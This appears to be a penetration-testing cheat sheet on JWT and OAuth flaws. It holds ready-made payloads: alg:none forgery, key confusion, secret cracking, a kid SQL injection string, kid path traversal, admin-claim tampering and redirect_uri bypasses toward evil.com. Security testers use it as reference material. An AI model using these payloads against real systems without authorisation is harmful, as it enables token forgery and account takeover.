# JWT and OAuth

Tokens are the keys to the app. Both classes have a small number of high-yield shapes.

---

## JWT

**Decode first** — never test blind.

```bash
python3 07-tooling/python/jwt_lite.py decode <token>
```

Look at `alg`, `kid`, `jku`, `x5u`, and every claim (`sub`, `role`, `org`, `exp`, `aud`).

### Attacks

| Attack | Test |
|---|---|
| `alg: none` | Set `alg` to `none`/`None`/`NONE`, empty signature |
| HS256 with public key | `jwt_lite.py conf token --pubkey pub.pem` |
| Weak HMAC secret | `jwt_lite.py crack token -w rockyou.txt` |
| `kid` traversal | `"kid":"../../dev/null"` + empty-key HMAC |
| `kid` SQLi | `"kid":"x' UNION SELECT 'secret'-- -"` |
| `jku`/`x5u` | Point at your JWKS, sign with your key |
| No expiry check | Set `exp` in the past, replay |
| No signature check | Flip a signature byte |
| Claim trust | `"role":"admin"`, `"org":1`, `"sub":"admin"` |

### Where tokens live

`Authorization`, cookie, `?token=`, `localStorage`, `postMessage`, URL fragment.

---

## OAuth

### `redirect_uri`

```
https://t/cb?x=1                       extra param
https://t/cb/../evil                   path traversal
https://t.evil.com/cb                  subdomain
https://evil.com/cb                    if unregistered
https://t/cb%00.evil.com
https://t/cb#@evil.com
```

### `state`

Missing → login CSRF. Not bound to session → forge. Predictable → guess.

### `code`

Reusable? Redeemable from another client? Long-lived? Bound to `redirect_uri`?

### Implicit flow

Token in the fragment → leaks via `Referer`, history, and any XSS on the callback page.

### Account linking

Link an attacker's social account to a victim's local account without confirmation →
takeover.

### Scope

`scope=admin`, `scope=*`, extra scopes silently granted.

---

## Go deeper

1. Test the `redirect_uri` with a path that is registered but has an open redirect.
2. Test whether `state` is validated at all (send a random one).
3. Test whether a code from client A works on client B.
4. Test the refresh token: rotation, reuse, lifetime, revocation on logout.
5. Test the token on the mobile API and on the legacy host.

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
